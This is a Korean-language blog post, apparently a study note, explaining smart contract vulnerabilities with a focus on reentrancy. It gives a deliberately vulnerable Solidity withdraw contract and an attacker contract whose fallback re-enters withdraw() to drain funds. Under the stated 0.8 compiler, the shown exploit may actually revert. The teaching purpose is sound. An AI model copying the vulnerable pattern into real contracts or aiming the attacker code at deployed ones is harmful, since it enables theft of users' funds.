---
layout: post
title: "Smart Contract Vulnerabilities"
date: 2023-11-26 10:29:53
excerpt: <b>&#35;Smart Contract, &#35;Solidity, &#35;Vulnerability</b>
---
## 목차
- [Smart Contract의 보안성](#smart-contract의-보안성)
- [Reentrancy Attacks](#reentrancy-attacks)

---
## Smart Contract의 보안성

Smart Contract는 사용자가 원하는 계약의 조건을 Solidity와 같은 언어를 이용해 코드로 작성해서 블록체인 네트워크에 배포한다. 결국 이 Smart Contract는 사용자가 작성한 코드이기 때문에 취약점이 있을 수밖에 없다. 또한 Smart Contract는 블록체인의 특성인 불변성에 따라서 한 번 배포된 이후에는 변경될 수 없기 때문에 Smart Contract를 작성할 때는 신중해야 한다.

이 Smart Contract에서 발생할 수 있는 취약점은 Reentrancy, Missing Access Controls, Weak Access Controls, Privilege Escalation, Governance를 포함한 다양한 취약점이 있다.

---
## Reentrancy Attacks

재진입 공격은 일반적으로 스마트 컨트랙트 내부에서 외부 컨트랙트나 함수를 호출할 때 발생하는데, 트랜잭션이 끝나기 전에 공격자가 함수 호출을 재진입하여 컨트랙트의 상태를 변경할 수 있는 취약점이다. (자금 유출, 상태 변조, Dos와 같은 것들로 이어질 수 있다.)

```solidity
pragma solidity ^0.8.0;

contract Vulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= _amount;
    }
}
```
위의 코드는 간단한 계정 입출금을 처리하는 스마트 컨트랙트이다. `deposit()` 함수를 호출하여 잔액을 입금하고, `withdraw()` 함수를 호출하여 잔액을 출금할 수 있다. 위 코드를 분석해 보면 하나의 취약점이 있다. `withdraw()` 함수에서 잘못된 방식으로 외부로 돈을 출금하고 있다. 구현되어 있는 로직을 보면 돈을 먼저 출금한 이후에 사용자의 잔액을 차감하고 있다. 이 경우에 트랜잭션이 끝나기 전에 공격자는 `withdraw()` 함수를 재호출할 수 있다.

![](https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc889fbc8-ca9c-47cd-91fb-07fcd1ab987c_1518x801.png)

재진입 공격을 구성도로 나타내면 위와 같다. 재진입 공격에 취약한 스마트 컨트랙트는 잔액 출금 트랜잭션이 끝난 이후에 잔액을 차감한다. 그러나 출금 트랜잭션이 끝나기 전에 `fallback()` 또는 `receive()` 함수를 통해서 취약한 컨트랙트의 `withdraw()` 함수를 재호출함으로 잔액이 차감되기 전에 다시 컨트랙트 내에 있는 자금을 해커의 잔액만큼 계속 가져올 수 있다. (해커의 잔액이 0으로 업데이트되지 않았기 때문에 출금이 되었더라도 현재 잔액은 그대로 저장되어 있음.)

```solidity
contract Attacker {
    Vulnerable vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = Vulnerable(_vulnerableAddress);
    }

    function attack() public payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw(msg.value);
    }

    fallback() external payable {
        if (address(vulnerable).balance >= msg.value) {
            vulnerable.withdraw(msg.value);
        }
    }
}
```
재진입 공격 코드는 위와 같이 작성할 수 있다. 취약한 컨트랙트의 `deposit()` 함수를 이용해서 이더를 송금한 이후에 `withdraw()` 함수를 이용해서 잔액을 출금한다. 이때 취약한 컨트랙트에서 Attacker 컨트랙트로 돈을 송금하면 fallback() 함수가 호출된다. 이 fallback() 함수 내에서 바로 취약한 컨트랙트의 `withdraw()` 함수를 재호출해서 잔액을 다시 출금할 수 있다.